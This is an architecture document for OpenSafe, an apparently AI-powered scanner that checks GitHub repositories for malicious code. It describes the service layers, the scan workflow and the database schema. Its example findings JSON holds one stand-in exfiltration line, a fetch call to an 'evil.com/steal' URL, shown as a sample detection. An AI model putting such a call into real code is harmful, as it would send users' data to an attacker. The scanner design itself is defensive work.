# OpenSafe Architecture Documentation

## Table of Contents

- [Overview](#overview)
- [High-Level System Design](#high-level-system-design)
- [Architecture Principles](#architecture-principles)
- [Directory Structure](#directory-structure)
- [Component Relationships](#component-relationships)
- [Data Flow](#data-flow)
- [Service Layer Architecture](#service-layer-architecture)
- [Database Schema](#database-schema)
- [External API Integrations](#external-api-integrations)
- [Authentication & Authorization](#authentication--authorization)
- [Scan Workflow](#scan-workflow)
- [Performance Optimizations](#performance-optimizations)
- [Security Considerations](#security-considerations)
- [Configuration & Constants](#configuration--constants)

---

## Overview

OpenSafe is a repository scanning application that analyzes GitHub repos for malicious code, suspicious dependencies, and security threats. It uses AI-powered analysis (Google Gemini) combined with intelligent heuristics to assess repository safety for open-source contributors.

**Core Technologies:**

- **Framework**: Next.js 15 (App Router)
- **Language**: TypeScript
- **AI Provider**: Google Gemini API
- **Database**: Snowflake
- **Authentication**: Auth0 (with GitHub OAuth)
- **Deployment**: Vercel (recommended)

---

## High-Level System Design

```
┌─────────────────────────────────────────────────────────────────────┐
│                            User Browser                              │
└────────────────────────┬────────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────────┐
│                         Next.js Frontend                             │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐             │
│  │  Home Page   │  │  Scan Page   │  │  Repo Page   │             │
│  │  (page.tsx)  │  │  (scan/)     │  │  (repo/[])   │             │
│  └──────────────┘  └──────────────┘  └──────────────┘             │
└────────────────────────┬────────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────────┐
│                      Middleware Layer                                │
│                   (Auth0 Session Check)                              │
└────────────────────────┬────────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────────┐
│                         API Routes Layer                             │
│  ┌──────────────────────────┐  ┌──────────────────────────┐        │
│  │  POST /api/scan-gemini   │  │  GET /api/repos          │        │
│  │  (Scan Repository)       │  │  (List Scans)            │        │
│  └──────────────────────────┘  └──────────────────────────┘        │
└────────────────────────┬────────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────────┐
│                        Service Layer (lib/)                          │
│  ┌────────────────┐  ┌────────────────┐  ┌────────────────┐        │
│  │ GitHub Client  │  │ Gemini Service │  │ Database Layer │        │
│  │  (lib/github)  │  │  (lib/ai)      │  │ (lib/database) │        │
│  └────────────────┘  └────────────────┘  └────────────────┘        │
└────────────────────────┬────────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────────┐
│                      External Services                               │
│  ┌────────────────┐  ┌────────────────┐  ┌────────────────┐        │
│  │  GitHub API    │  │  Gemini API    │  │  Snowflake DB  │        │
│  └────────────────┘  └────────────────┘  └────────────────┘        │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Architecture Principles

### 1. Service Layer Pattern

**Why We Use This Pattern:**

- **Reusability**: Business logic in `lib/` can be used by API routes, CLI scripts, background jobs, and tests
- **Testability**: Service layer can be unit tested without HTTP overhead
- **Framework-Agnostic**: Business logic is independent of Next.js, making it portable
- **Separation of Concerns**: HTTP concerns (auth, validation, JSON responses) stay in API routes

**What This Means:**

- ✅ **API routes are thin**: They handle only authentication, validation, and HTTP responses
- ✅ **Business logic lives in `lib/`**: All scanning, data fetching, and processing happens here
- ✅ **Do NOT move logic to API routes**: This would break testability and reusability

### 2. Domain-Grouped Organization

Files are organized by domain (ai/, database/, github/) rather than by feature, making it easier to:

- Find related functionality
- Add new providers (e.g., `ai/claude/`, `database/postgres/`)
- Understand system boundaries
- Scale the codebase

### 3. Type Safety First

- All functions have explicit return types
- Shared types live in dedicated `types/` directory
- Runtime validation with Zod for API inputs
- No `any` types in production code

---

## Directory Structure

```
opensafe/
├── app/                          # Next.js App Router (UI + API routes)
│   ├── api/                      # API route handlers (thin HTTP layer)
│   │   ├── repos/
│   │   │   └── route.ts          # GET /api/repos - List scanned repos
│   │   └── scan-gemini/
│   │       └── route.ts          # POST /api/scan-gemini - Scan repo
│   ├── repo/[owner]/[name]/      # Repository detail pages
│   │   ├── page.tsx              # Main repo scan results page
│   │   ├── security-findings.tsx # Findings display component
│   │   └── rescan-button.tsx     # Rescan UI component
│   ├── scan/                     # Scan initiation page
│   │   └── page.tsx
│   ├── layout.tsx                # Root layout with nav
│   └── page.tsx                  # Home page
│
├── lib/                          # Service layer (business logic)
│   ├── ai/                       # AI service providers
│   │   └── gemini/
│   │       ├── gemini-service.ts # Low-level Gemini API client
│   │       └── scan-workflow.ts  # High-level scan orchestrator
│   ├── database/                 # Database adapters
│   │   └── snowflake.ts          # Snowflake operations
│   ├── github/                   # GitHub API client
│   │   └── client.ts             # Repository data fetching
│   ├── scan/                     # Scan helpers and optimization
│   │   └── scan-helpers.ts       # Caching, strategy selection
│   ├── validations/              # Input validation and sanitization
│   │   ├── api.ts                # API request validation
│   │   └── env.ts                # Environment variable validation
│   ├── auth0.ts                  # Auth0 configuration
│   ├── constants.ts              # Application constants
│   ├── ui-helpers.ts             # UI utility functions
│   └── utils.ts                  # General utilities
│
├── types/                        # TypeScript type definitions
│   ├── api.ts                    # API request/response types
│   ├── database.ts               # Database schema types
│   ├── github.ts                 # GitHub API types
│   └── scan.ts                   # Scan result types
│
├── middleware.ts                 # Global Auth0 middleware
├── .env.example                  # Environment variable template
└── docs/                         # Documentation
    ├── API.md                    # API endpoint documentation
    └── ARCHITECTURE.md           # This file
```

---

## Component Relationships

### API Route → Service Layer Flow

```
┌────────────────────────────────────────────────────────────────────┐
│  API Route (app/api/scan-gemini/route.ts)                          │
│                                                                     │
│  Responsibilities:                                                  │
│  1. Check authentication (Auth0 session)                           │
│  2. Validate & sanitize input (Zod schemas)                        │
│  3. Call service layer functions                                   │
│  4. Return HTTP responses (JSON)                                   │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  Service Layer (lib/scan/scan-helpers.ts)                          │
│                                                                     │
│  Responsibilities:                                                  │
│  1. Orchestrate workflow                                           │
│  2. Call other services (GitHub, Gemini, Database)                 │
│  3. Apply business logic (caching, optimization)                   │
│  4. Return typed data                                              │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│  External Services                                                   │
│                                                                      │
│  ┌──────────────────┐  ┌──────────────────┐  ┌──────────────────┐ │
│  │ GitHubClient     │  │ GeminiService    │  │ Snowflake DB     │ │
│  │ (lib/github)     │  │ (lib/ai/gemini)  │  │ (lib/database)   │ │
│  └──────────────────┘  └──────────────────┘  └──────────────────┘ │
└─────────────────────────────────────────────────────────────────────┘
```

**Example Flow:**

1. User submits scan request
2. `POST /api/scan-gemini` validates auth & input
3. Calls `fetchRepoScanContext()` → `GitHubClient.getRepoMetadata()`
4. Calls `executeScanStrategy()` → `GeminiScanWorkflow.scanRepository()`
5. Calls `saveScanResults()` → `insertScannedRepo()`
6. Returns JSON response to client

---

## Data Flow

### Complete Scan Workflow

```
┌───────────────┐
│ User submits  │
│ repository URL│
└───────┬───────┘
        │
        ▼
┌────────────────────────────────────────────────────────┐
│ 1. Authentication & Validation                         │
│    - Auth0 session check                               │
│    - Zod schema validation                             │
│    - URL parsing & sanitization                        │
└────────────────┬───────────────────────────────────────┘
                 │
                 ▼
┌────────────────────────────────────────────────────────┐
│ 2. Fetch Repository Context                           │
│    - GitHub API: Get repo metadata                     │
│    - Snowflake DB: Check for previous scan            │
└────────────────┬───────────────────────────────────────┘
                 │
                 ▼
┌────────────────────────────────────────────────────────┐
│ 3. Check Optimization Conditions                      │
│    ┌──────────────────────────────────────┐          │
│    │ Is repo unchanged since last scan?   │          │
│    └──────┬───────────────────────┬────────┘          │
│           │ YES                    │ NO                │
│           ▼                        ▼                   │
│    Return cached result      Continue to scan         │
└────────────────┬───────────────────────────────────────┘
                 │
                 ▼
┌────────────────────────────────────────────────────────┐
│ 4. Determine Scan Strategy                            │
│    ┌──────────────────────────────────────┐          │
│    │ Does repo have 1000+ stars?          │          │
│    └──────┬───────────────────────┬────────┘          │
│           │ YES                    │ NO                │
│           ▼                        ▼                   │
│    Return "safe"         Perform full AI scan         │
└────────────────┬───────────────────────────────────────┘
                 │
                 ▼
┌────────────────────────────────────────────────────────┐
│ 5. Full AI Scan (GeminiScanWorkflow)                  │
│                                                        │
│    ┌──────────────────────────────────────┐          │
│    │ Step 1: Fetch Repository Content     │          │
│    │  - GitHub API: Get file tree         │          │
│    │  - Prioritize security-relevant files│          │
│    │  - Fetch file contents              │          │
│    │  - Parse package.json               │          │
│    └───────────────┬──────────────────────┘          │
│                    │                                   │
│                    ▼                                   │
│    ┌──────────────────────────────────────┐          │
│    │ Step 2: Detect Security Risks        │          │
│    │  - Batch files (5 per batch)        │          │
│    │  - Gemini API: Analyze each batch   │          │
│    │  - Aggregate findings                │          │
│    └───────────────┬──────────────────────┘          │
│                    │                                   │
│                    ▼                                   │
│    ┌──────────────────────────────────────┐          │
│    │ Step 3: Calculate Safety Level       │          │
│    │  - Gemini API: Assess severity      │          │
│    │  - Generate AI summary              │          │
│    │  - Determine: safe/caution/unsafe   │          │
│    └───────────────┬──────────────────────┘          │
└────────────────────┴───────────────────────────────────┘
                     │
                     ▼
┌────────────────────────────────────────────────────────┐
│ 6. Save Results to Database                           │
│    - Insert/update SCANNED_REPOS table                │
│    - Store findings as JSON                           │
│    - Record scan timestamp                            │
└────────────────┬───────────────────────────────────────┘
                 │
                 ▼
┌────────────────────────────────────────────────────────┐
│ 7. Return Results to Client                           │
│    - JSON response with scan results                  │
│    - Safety level, findings, AI summary               │
│    - Repository metadata                              │
└────────────────────────────────────────────────────────┘
```

---

## Service Layer Architecture

### Why Business Logic Lives in `lib/`

The service layer pattern is critical to OpenSafe's architecture. Here's why:

#### Benefits

1. **Reusability**
   - Services can be used by multiple consumers:
     - API routes (`app/api/`)
     - CLI scripts (`scripts/`)
     - Background jobs (future)
     - Tests (`__tests__/`)

2. **Testability**
   - Business logic can be unit tested without HTTP overhead
   - Mock external APIs (GitHub, Gemini) in tests
   - Test edge cases without making real API calls

3. **Framework Independence**
   - Business logic doesn't depend on Next.js
   - Easy to migrate to different framework if needed
   - Can reuse logic in other contexts (CLI tools, Lambda functions)

4. **Separation of Concerns**
   - API routes handle only HTTP-specific concerns:
     - Authentication (Auth0)
     - Input validation (Zod)
     - HTTP status codes
     - JSON serialization
   - Service layer handles business logic:
     - Data fetching
     - Processing
     - Storage
     - Orchestration

#### Example: The Right Way vs Wrong Way

**✅ Correct: Thin API Route**

```typescript
// app/api/scan-gemini/route.ts
export async function POST(request: NextRequest) {
  // 1. Check authentication
  const session = await auth0.getSession();
  if (!session?.user) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }

  // 2. Validate input
  const validatedData = validateAndSanitize(scanRequestSchema, body);

  // 3. Call service layer
  const result = await executeScanStrategy(
    repoUrl,
    repoMetadata,
    geminiApiKey,
    githubToken
  );

  // 4. Return response
  return NextResponse.json(result, { status: 200 });
}
```

**❌ Wrong: Business Logic in API Route**

```typescript
// DON'T DO THIS!
export async function POST(request: NextRequest) {
  const session = await auth0.getSession();

  // ❌ Bad: Gemini API calls directly in route
  const geminiService = new GeminiService({ apiKey: geminiApiKey });
  const prompt = `Analyze this repository...`;
  const findings = await geminiService.callGeminiJSON(prompt, options);

  // ❌ Bad: Complex processing in route
  const safetyLevel = calculateSafetyLevel(findings);

  // ❌ Bad: Direct database calls
  const conn = await getConnection();
  await conn.execute({ sqlText: `INSERT INTO...` });

  return NextResponse.json(result);
}
```

**Why the second approach is wrong:**

- Can't test business logic without HTTP server
- Can't reuse scan logic in CLI scripts
- Harder to mock external services
- Violates single responsibility principle
- Tightly couples to Next.js

---

## Database Schema

### Snowflake Database Structure

**Database**: Configurable (via `SNOWFLAKE_DATABASE`)
**Schema**: `PUBLIC` (default, configurable via `SNOWFLAKE_SCHEMA`)

#### Table: `SCANNED_REPOS`

Stores historical scan results for repositories.

```sql
CREATE OR REPLACE TABLE OPENSAFE_DB.PUBLIC.SCANNED_REPOS (
  ID NUMBER(38,0) NOT NULL AUTOINCREMENT START 1 INCREMENT 1 NOORDER,
  REPO_OWNER VARCHAR(255) NOT NULL,
  REPO_NAME VARCHAR(255) NOT NULL,
  LANGUAGE VARCHAR(100),
  SAFETY_SCORE VARCHAR(10) NOT NULL,  -- 'SAFE', 'CAUTION', 'UNSAFE'
  FINDINGS VARIANT,                   -- JSON object with findings
  SCANNED_AT TIMESTAMP_NTZ(9) DEFAULT CURRENT_TIMESTAMP(),
  SCANNED_BY VARCHAR(255),
  PRIMARY KEY (ID)
);
```

**Note**: The table does not have a `UNIQUE` constraint on `(REPO_OWNER, REPO_NAME)`. The UPSERT logic in the application code handles duplicate detection using the `MERGE` statement's `ON` clause instead of relying on database constraints.

#### Field Descriptions

| Field          | Type             | Description                                                             |
| -------------- | ---------------- | ----------------------------------------------------------------------- |
| `ID`           | NUMBER(38,0)     | Auto-incrementing primary key                                           |
| `REPO_OWNER`   | VARCHAR(255)     | GitHub repository owner username                                        |
| `REPO_NAME`    | VARCHAR(255)     | GitHub repository name                                                  |
| `LANGUAGE`     | VARCHAR(100)     | Primary programming language                                            |
| `SAFETY_SCORE` | VARCHAR(10)      | Safety assessment: 'SAFE', 'CAUTION', 'UNSAFE'                          |
| `FINDINGS`     | VARIANT          | JSON object containing all findings (maliciousCode, dependencies, etc.) |
| `SCANNED_AT`   | TIMESTAMP_NTZ(9) | UTC timestamp of scan (defaults to CURRENT_TIMESTAMP)                   |
| `SCANNED_BY`   | VARCHAR(255)     | User email/identifier who initiated scan                                |

#### UPSERT Pattern

The database uses SQL `MERGE` statements for upsert operations:

- If `(REPO_OWNER, REPO_NAME)` exists → UPDATE all fields
- If not exists → INSERT new record

This ensures each repository has only one record (most recent scan).

**Example Findings JSON Structure:**

```json
{
  "maliciousCode": [
    {
      "item": "Suspicious network call",
      "location": "src/index.js",
      "issue": "Makes unauthorized POST request to unknown domain",
      "severity": "severe",
      "codeSnippet": "fetch('https://evil.com/steal', ...)",
      "batchId": 1
    }
  ],
  "dependencies": [],
  "networkActivity": [],
  "fileSystemSafety": [],
  "credentialSafety": []
}
```

---

## External API Integrations

### 1. GitHub API

**Purpose**: Fetch repository metadata, file contents, and commit history

**Client**: `lib/github/client.ts` (`GitHubClient` class)

**Authentication**: Personal Access Token (optional, but recommended)

- Authenticated: 5,000 requests/hour
- Unauthenticated: 60 requests/hour

**Key Operations**:

- `getRepoMetadata()` - Fetch repo info (stars, language, last push)
- `getRepoTree()` - Get complete file tree (recursive)
- `findFilesToScan()` - Prioritize security-relevant files
- `scanFiles()` - Fetch file contents in batch

**File Prioritization Strategy**:

1. **Priority 1 (Critical)**: `package.json`, `.env*`, credentials, secrets
2. **Priority 2 (High)**: Install scripts (`postinstall.js`, `preinstall.js`)
3. **Priority 3 (Medium)**: Scripts in key directories (`scripts/`, `build/`)
4. **Priority 4 (Low)**: Executables (`.exe`, `.sh`, `.bat`)

**Rate Limiting**: No internal rate limiting (relies on GitHub's limits)

---

### 2. Google Gemini API

**Purpose**: AI-powered code analysis for malicious patterns

**Client**: `lib/ai/gemini/gemini-service.ts` (`GeminiService` class)
**Orchestrator**: `lib/ai/gemini/scan-workflow.ts` (`GeminiScanWorkflow` class)

**Model**: `gemini-2.5-flash` (default, configurable)

**Rate Limits**:

- Free tier: 10 requests/minute, 250 requests/day
- Enforced internally with 6-second minimum interval between requests

**Key Operations**:

1. **Risk Detection** (`detectRisks()`)
   - Temperature: 0.2 (low for consistency)
   - Max tokens: 65,536
   - Thinking budget: 8,000 tokens
   - Batch size: 5 files per request
   - Returns structured JSON with findings

2. **Safety Level Calculation** (`calculateSafetyLevel()`)
   - Temperature: 0.1 (very low for deterministic results)
   - Max tokens: 32,768
   - Returns: `safe` | `caution` | `unsafe`

**Error Handling**:

- Automatic retries with exponential backoff (max 3 retries)
- Rate limit detection → 10-second wait
- JSON parsing fallback strategies

**Response Schema Enforcement**:

- Uses `responseSchema` parameter for structured output
- Ensures consistent JSON structure
- Fallback to manual parsing if schema fails

---

### 3. Snowflake Database

**Purpose**: Persistent storage for scan results and caching

**Client**: `lib/database/snowflake.ts`

**Connection Pooling**: Singleton connection reused across requests

**Key Operations**:

- `getConnection()` - Get/create database connection
- `executeQuery()` - Run parameterized SQL queries
- `insertScannedRepo()` - Upsert scan results
- `getScannedRepos()` - Fetch recent scans (max 100)
- `getRepoByOwnerAndName()` - Get specific repo scan

**Query Parameterization**: All queries use bound parameters (prevents SQL injection)

**Cost Optimization**:

- Use X-Small warehouse for development
- Connection pooling reduces overhead
- UPSERT pattern minimizes storage

---

### 4. Auth0

**Purpose**: User authentication via GitHub OAuth

**Client**: `lib/auth0.ts` (exported `auth0` instance)
**Middleware**: `middleware.ts` (global session check)

**Configuration**:

- Provider: GitHub OAuth
- Session storage: Encrypted cookies (`appSession`)
- Session encryption: AES-256-GCM (via `AUTH0_SECRET`)

**Protected Routes**: All routes except static assets

**Session Recovery**: Middleware automatically clears corrupted sessions (JWE errors)

**User Data Available**:

- `session.user.email` - User email
- `session.user.name` - User name
- Used for `SCANNED_BY` field in database

---

## Authentication & Authorization

### Middleware Flow

```
┌─────────────────────────────────────────────────┐
│ Every Request                                   │
└───────────────────┬─────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────┐
│ middleware.ts                                   │
│                                                 │
│ 1. Check if request matches protected route    │
│ 2. Verify Auth0 session cookie                 │
│ 3. Handle session errors (clear corrupted)     │
└───────────────────┬─────────────────────────────┘
                    │
        ┌───────────┴───────────┐
        │ NO SESSION            │ HAS SESSION
        ▼                       ▼
┌─────────────────┐   ┌─────────────────┐
│ Redirect to     │   │ Continue to     │
│ /api/auth/login │   │ requested page  │
└─────────────────┘   └─────────────────┘
```

### API Route Protection

```typescript
// app/api/scan-gemini/route.ts
export async function POST(request: NextRequest) {
  // Check authentication
  const session = await auth0.getSession();
  if (!session?.user) {
    return NextResponse.json(
      { error: 'Unauthorized - Please log in' },
      { status: 401 }
    );
  }

  // Validate user session
  if (!session.user.email && !session.user.name) {
    return NextResponse.json(
      { error: 'Invalid user session' },
      { status: 400 }
    );
  }

  // Continue with authenticated request...
}
```

---

## Scan Workflow

### Three-Step Process

#### Step 1: Fetch Repository Content

**Location**: `lib/ai/gemini/scan-workflow.ts` → `fetchRepoContent()`

**Operations**:

1. Parse GitHub URL → extract owner/repo
2. Fetch repository metadata (stars, language, last push)
3. Get complete file tree (recursive)
4. Identify security-relevant files (prioritized)
5. Fetch file contents (batch operation)
6. Parse `package.json` and extract install scripts

**Output**: `RepoContentData` object with all fetched data

**No AI Used**: This is pure GitHub API fetching

---

#### Step 2: Detect Security Risks

**Location**: `lib/ai/gemini/scan-workflow.ts` → `detectRisks()`

**Operations**:

1. Divide files into batches (5 files per batch)
2. For each batch:
   - Build detailed prompt with security focus
   - Call Gemini API with structured response schema
   - Extract findings (maliciousCode, dependencies, etc.)
   - Handle errors gracefully (continue with next batch)
3. Aggregate findings from all batches
4. Save findings to disk (development only)

**AI Model**: Gemini 2.5 Flash
**Temperature**: 0.2 (low for consistency)
**Batch Size**: 5 files (configurable via `SCAN_BATCH_SIZE`)

**Output**: `Findings` object with categorized security issues

**Severity Filtering**: Only reports `moderate` and `severe` findings (ignores `low`)

---

#### Step 3: Calculate Safety Level

**Location**: `lib/ai/gemini/scan-workflow.ts` → `calculateSafetyLevel()`

**Operations**:

1. Build prompt with all findings from Step 2
2. Call Gemini API to assess overall safety
3. Apply safety level rules:
   - **"unsafe"**: ANY severe findings → immediate threat
   - **"caution"**: ONLY moderate findings → potential concerns
   - **"safe"**: NO moderate/severe findings → completely safe
4. Generate AI summary (2-3 sentences)
5. Save assessment to disk (development only)

**AI Model**: Gemini 2.5 Flash
**Temperature**: 0.1 (very low for deterministic results)

**Output**: `SafetyLevel` + AI-generated summary

---

### Optimization Strategies

#### 1. Cached Results (Unchanged Repos)

**Condition**: Repository hasn't been updated since last scan
**Check**: Compare `lastPushedAt` from GitHub with `SCANNED_AT` in database
**Action**: Return cached results immediately
**Benefit**: Zero API calls, instant response

**Flag**: `unchangedSinceLastScan: true` in response

---

#### 2. Trusted by Stars (1000+ Stars)

**Condition**: Repository has ≥1000 stars
**Rationale**: High-star repos are heavily scrutinized and unlikely to contain malware
**Action**: Return "safe" without AI scan
**Benefit**: Saves Gemini API tokens and time

**Flag**: `trustedByStar: true` in response

---

#### 3. Rate Limiting

**Gemini API**: Internal rate limiting enforces 6-second minimum interval between requests
**Implementation**: `GeminiService.callGeminiJSON()` tracks last request time
**Benefit**: Prevents hitting API rate limits and rate limit errors

---

## Performance Optimizations

### 1. File Prioritization

Not all files are scanned. OpenSafe prioritizes security-relevant files:

- Config files (`package.json`, `.env`)
- Install scripts (auto-execute during `npm install`)
- Executable files (`.sh`, `.exe`, `.bat`)
- Scripts in key directories (`scripts/`, `build/`)

**Benefit**: Reduces API calls and focuses on high-risk areas

---

### 2. File Size Limits

- Lock files (`package-lock.json`, `yarn.lock`) → Skipped entirely
- Files >100KB → Skipped with message
- Files >1MB (GitHub API limit) → Cannot fetch

**Benefit**: Reduces token usage and API response time

---

### 3. Batch Processing

Files are analyzed in batches of 5 (configurable) to:

- Reduce total Gemini API calls
- Provide more context per request
- Balance token usage vs. request count

**Benefit**: Fewer API calls, better rate limit management

---

### 4. Connection Pooling (Database)

Snowflake connection is reused across requests via singleton pattern:

```typescript
let connection: snowflake.Connection | null = null;

export function getConnection(): Promise<snowflake.Connection> {
  if (connection && connection.isUp()) {
    return Promise.resolve(connection); // Reuse
  }
  // Create new connection...
}
```

**Benefit**: Faster database operations, reduced connection overhead

---

### 5. Caching Strategy

Two-level caching:

1. **Database cache**: Stores all scan results
2. **Unchanged repo check**: Returns cached result if repo hasn't been updated

**Cache Invalidation**: Automatic when `lastPushedAt` changes

---

## Security Considerations

### 1. Input Validation & Sanitization

**Layer 1: Zod Schema Validation**

```typescript
// lib/validations/api.ts
export const scanRequestSchema = z.object({
  repoUrl: z.string().url().min(1).max(500),
});
```

**Layer 2: Sanitization**

```typescript
export function sanitizeString(input: string): string {
  return input.trim().replace(/[<>]/g, ''); // Remove HTML tags
}
```

**Applied to**:

- Repository URLs
- User inputs
- API request bodies

---

### 2. SQL Injection Prevention

**Parameterized Queries**: All database queries use bound parameters

```typescript
const query = `SELECT * FROM SCANNED_REPOS WHERE REPO_OWNER = ? AND REPO_NAME = ?`;
await executeQuery(query, [owner, name]); // ✅ Safe
```

**Never**:

```typescript
// ❌ NEVER DO THIS!
const query = `SELECT * FROM SCANNED_REPOS WHERE REPO_OWNER = '${owner}'`;
```

---

### 3. Authentication Enforcement

**Middleware**: Every request passes through Auth0 middleware
**API Routes**: Double-check session in route handler
**Session Encryption**: AES-256-GCM via `AUTH0_SECRET`

---

### 4. Environment Variable Validation

**Runtime Check**: `lib/validations/env.ts` validates all required env vars on startup
**Zod Schemas**: Type-safe environment configuration
**Fail Fast**: Application exits if critical env vars missing

---

### 5. Error Handling

**Sensitive Data**: Never expose API keys, database passwords in error messages
**Generic Errors**: Public-facing errors are generic ("Scan failed")
**Detailed Logging**: Full errors logged server-side for debugging

---

### 6. Rate Limiting

**Gemini API**: Internal rate limiting prevents abuse
**Auth0**: Built-in rate limiting on authentication endpoints
**GitHub API**: Respects GitHub's rate limits (5000/hour authenticated)

---

## Configuration & Constants

### Environment Variables

All configuration is managed via environment variables. See `.env.example` for full list.

**Required Variables**:

- `GITHUB_TOKEN` - GitHub API access
- `GEMINI_API_KEY` - Gemini AI access
- `AUTH0_DOMAIN`, `AUTH0_CLIENT_ID`, `AUTH0_CLIENT_SECRET`, `AUTH0_SECRET` - Authentication
- `SNOWFLAKE_ACCOUNT`, `SNOWFLAKE_USERNAME`, `SNOWFLAKE_PASSWORD`, etc. - Database

**Optional Flags**:

- `ENABLE_STAR_THRESHOLD_CHECK` - Enable trusted-by-stars optimization (default: `true`)
- `ENABLE_UNCHANGED_REPO_CHECK` - Enable cached results for unchanged repos (default: `true`)

---

### Application Constants

**Location**: `lib/constants.ts`

**Key Constants**:

| Constant                         | Value                | Purpose                              |
| -------------------------------- | -------------------- | ------------------------------------ |
| `DEFAULT_GEMINI_MODEL`           | `'gemini-2.5-flash'` | AI model to use                      |
| `GEMINI_MIN_REQUEST_INTERVAL_MS` | `6000`               | 6 seconds between API calls (10 RPM) |
| `GEMINI_MAX_RETRIES`             | `3`                  | Maximum retry attempts               |
| `SCAN_BATCH_SIZE`                | `5`                  | Files per Gemini batch               |
| `TRUSTED_REPO_STAR_THRESHOLD`    | `1000`               | Star count for auto-safe             |
| `MAX_REPOS_FETCH_LIMIT`          | `100`                | Max repos to return from DB          |

**Temperature Values**:

- Risk detection: `0.2` (balanced)
- Safety level: `0.1` (highly deterministic)

---

## Deployment Considerations

### Vercel (Recommended)

**Configuration**:

- Framework: Next.js 15
- Build command: `npm run build`
- Output directory: `.next`
- Environment variables: Set in Vercel dashboard

**Edge Runtime**: Not used (requires Node.js runtime for Snowflake SDK)

---

### Environment-Specific Settings

**Development**:

- Scan results saved to disk (`scan_results/`)
- Verbose logging enabled
- Lower rate limits acceptable

**Production**:

- Scan results NOT saved to disk
- Error messages generic
- Monitoring and alerting recommended

---

## Future Architecture Considerations

### Scalability

**Current Bottlenecks**:

1. Gemini API rate limits (10 RPM free tier)
2. Sequential batch processing
3. Single Snowflake connection

**Future Improvements**:

1. Implement job queue (Bull, BullMQ) for async scanning
2. Add Redis caching layer
3. Support multiple AI providers (Claude, GPT)
4. Horizontal scaling with load balancer

---

### Extensibility

**Easy to Add**:

- New AI providers: Create `lib/ai/claude/` following same pattern
- New database adapters: Create `lib/database/postgres/`
- Background job processing: Reuse existing service layer
- CLI tools: Import and use service layer functions

---

## Glossary

- **Batch**: Group of files analyzed together in a single Gemini API call
- **Finding**: Individual security issue detected during scan
- **Priority**: Ranking of files by security relevance (1=highest, 4=lowest)
- **Safety Level**: Overall assessment: `safe`, `caution`, or `unsafe`
- **Service Layer**: Business logic in `lib/` directory (framework-agnostic)
- **UPSERT**: SQL operation that updates existing record or inserts new one

---

## Additional Resources

- [API Documentation](./API.md)
- [Contributing Guidelines](../CONTRIBUTING.md)
- [Security Policy](../SECURITY.md)
- [Next.js Documentation](https://nextjs.org/docs)
- [Gemini API Documentation](https://ai.google.dev/docs)
- [Snowflake Documentation](https://docs.snowflake.com/)

---

**Last Updated**: 2025-01-19
**OpenSafe Version**: 1.0.0
**Maintained by**: OpenSafe Team
